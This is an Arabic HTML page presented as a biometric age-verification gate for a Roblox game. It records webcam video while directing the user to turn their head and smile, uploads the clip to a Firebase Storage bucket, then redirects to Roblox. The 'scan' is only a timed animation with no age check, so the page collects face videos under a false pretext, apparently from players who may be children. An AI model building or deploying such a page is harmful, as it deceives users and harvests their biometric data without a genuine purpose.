<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة فحص العمر - لعبة قيد الإنتاج</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0c1b, #24243e);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .main-wrapper {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            justify-content: center;
            max-width: 900px;
            width: 100%;
        }

        .gate-container, .result-video-box {
            background: rgba(15, 15, 26, 0.75);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0, 242, 254, 0.2);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 242, 254, 0.2);
            text-align: center;
            flex: 1;
            min-width: 320px;
        }

        h1, h2 { color: #00f2fe; margin-bottom: 5px; text-shadow: 0 0 10px rgba(0, 242, 254, 0.5); }
        p { color: #a4b0be; font-size: 14px; margin-bottom: 20px; }

        .camera-box {
            position: relative;
            width: 260px;
            height: 260px;
            margin: 0 auto 20px auto;
            border-radius: 50%;
            border: 4px dashed #00f2fe;
            overflow: hidden;
            background-color: #111;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: none; }
        
        #recordedVideo {
            width: 100%;
            max-width: 260px;
            border-radius: 10px;
            border: 2px solid #555;
            margin-top: 15px;
            display: none;
            transform: scaleX(1);
        }

        .guide-overlay {
            display: none;
            position: absolute;
            top: 15px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.8);
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: bold;
            color: #00f2fe;
            border: 1px solid #00f2fe;
            z-index: 10;
            white-space: nowrap;
        }

        .scan-line {
            display: none;
            position: absolute;
            width: 100%;
            height: 4px;
            background: #00f2fe;
            box-shadow: 0 0 12px #00f2fe;
            top: 0;
            z-index: 5;
            animation: scan 2.5s linear infinite;
        }

        @keyframes scan { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }

        button {
            background: linear-gradient(45deg, #00f2fe, #4facfe);
            color: #000;
            border: none;
            padding: 12px 25px;
            font-size: 15px;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 4px 15px rgba(0, 242, 254, 0.3);
            transition: 0.3s ease;
        }

        #statusText { margin-top: 15px; font-size: 15px; font-weight: bold; color: #4facfe; }
        #downloadBtn { background: linear-gradient(45deg, #2ed573, #7bed9f); margin-top: 15px; display: none; }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="gate-container">
            <h1>فحص العمر الحيوي</h1>
            <p>الرجاء تفعيل الكاميرا والتحقق من التعليمات الظاهرة.</p>
            
            <div class="camera-box" id="camBox">
                <div class="guide-overlay" id="guideOverlay">استعد...</div>
                <div class="scan-line" id="scanLine"></div>
                <video id="webcam" autoplay playsinline muted></video>
                <span id="placeholderText" style="color: #555;">الكاميرا مغلقة</span>
            </div>
            
            <button id="actionBtn">بدء الفحص وتسجيل الفيديو</button>
            <div id="statusText">جاهز للمحاكاة...</div>
        </div>

        <div class="result-video-box">
            <h2>الفيديو المسجل</h2>
            <p>هنا يظهر فيديو الفحص بعد انتهائه.</p>
            <video id="recordedVideo" controls></video>
            <button id="downloadBtn">⬇️ تحميل الفيديو</button>
        </div>
    </div>

    <!-- ربط Firebase من خلال سكريبت نولودج من نوع Module -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-analytics.js";
        // استدعاء مكتبة السحابة التخزينية (Storage) المطلوبة لرفع الفيديوهات
        import { getStorage, ref, uploadBytesResumable, getDownloadURL } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-storage.js";

        // إعدادات Firebase الخاصة بك
        const firebaseConfig = {
            apiKey: "AIzaSyC76_MIs1mXcl_hMipVBX__8m4vdlTeMsk",
            authDomain: "inde-edfe5.firebaseapp.com",
            projectId: "inde-edfe5",
            storageBucket: "inde-edfe5.firebasestorage.app",
            messagingSenderId: "636994240555",
            appId: "1:636994240555:web:fb5b2e80c600f00bf7aa6e",
            measurementId: "G-DR2FGXQFG8"
        };

        // تهيئة خدمات Firebase
        const app = initializeApp(firebaseConfig);
        const analytics = getAnalytics(app);
        const storage = getStorage(app);

        // جلب عناصر الـ HTML لربطها بالجافا سكريبت
        const video = document.getElementById('webcam');
        const guideOverlay = document.getElementById('guideOverlay');
        const scanLine = document.getElementById('scanLine');
        const placeholderText = document.getElementById('placeholderText');
        const actionBtn = document.getElementById('actionBtn');
        const statusText = document.getElementById('statusText');
        const recordedVideo = document.getElementById('recordedVideo');
        const downloadBtn = document.getElementById('downloadBtn');

        let mediaRecorder;
        let recordedChunks = [];
        const instructions = [
            "👤 ضع وجهك داخل الإطار الدائري",
            "➡️ التفت ببطء جهة اليمين",
            "⬅️ التفت ببطء جهة اليسار",
            "😊 ابتسم للتأكد من الملامح",
            "⚙️ جاري معالجة الفحص الحركي..."
        ];

        // تفعيل النقر على الزر الرئيسي
        actionBtn.addEventListener('click', startVerification);

        async function startVerification() {
            actionBtn.disabled = true;
            statusText.innerText = "جاري تشغيل الكاميرا وبدء التسجيل...";
            recordedChunks = [];

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                video.srcObject = stream;
                placeholderText.style.display = "none";
                video.style.display = "block";
                scanLine.style.display = "block";
                guideOverlay.style.display = "block";

                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
                
                // دالة معالجة انتهاء التسجيل لرفع الملف مباشرة إلى Firebase
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                    
                    // توليد رابط محلي للمستخدم لمعاينة الفيديو
                    recordedVideo.src = URL.createObjectURL(blob);
                    recordedVideo.style.display = "inline-block";
                    downloadBtn.style.display = "block";

                    // تفعيل تحميل الفيديو محلياً عند الضغط على زر التحميل
                    downloadBtn.onclick = () => {
                        const link = document.createElement('a');
                        link.download = `age_verification_${Date.now()}.mp4`;
                        link.href = recordedVideo.src;
                        link.click();
                    };

                    // بدء رفع الملف فوراً إلى مجلد "videos" في Firebase Storage باسم يعتمد على الوقت الفريد
                    statusText.innerText = "جاري رفع فيديو التحقق إلى الخادم التخزيني...";
                    const storageRef = ref(storage, 'videos/video_' + Date.now() + '.mp4');
                    const uploadTask = uploadBytesResumable(storageRef, blob);

                    // تتبع حالة الرفع
                    uploadTask.on('state_changed', 
                        (snapshot) => {
                            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
                            statusText.innerText = `جاري الرفع: ${Math.round(progress)}%`;
                        }, 
                        (error) => {
                            console.error("خطأ أثناء الرفع:", error);
                            statusText.innerText = "فشل الرفع إلى السيرفر، يرجى مراجعة قواعد الأمان.";
                            statusText.style.color = "#ff4757";
                        }, 
                        () => {
                            // عند نجاح الرفع بالكامل
                            statusText.innerText = "تم الرفع والتأكيد! جاري نقلك إلى روبلوكس...";
                            statusText.style.color = "#2ed573";
                            document.getElementById('camBox').style.borderColor = "#2ed573";

                            // التوجيه التلقائي إلى لعبة روبلوكس بعد ثانيتين
                            setTimeout(() => {
                                window.location.href = "https://www.roblox.com/games/YOUR_GAME_ID_HERE"; 
                            }, 2000);
                        }
                    );
                };

                mediaRecorder.start();
                runInstructions(0);
            } catch (err) {
                statusText.innerText = "فشل تشغيل الكاميرا. يرجى إعطاء صلاحية الكاميرا للموقع.";
                actionBtn.disabled = false;
            }
        }

        function runInstructions(index) {
            if (index < instructions.length) {
                guideOverlay.innerText = instructions[index];
                setTimeout(() => runInstructions(index + 1), 3000);
            } else {
                endVerification();
            }
        }

        function endVerification() {
            scanLine.style.display = "none";
            guideOverlay.innerText = "اكتمل الفحص! ✓";

            if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
            const stream = video.srcObject;
            if (stream) stream.getTracks().forEach(track => track.stop());
        }
    </script>
</body>
</html>
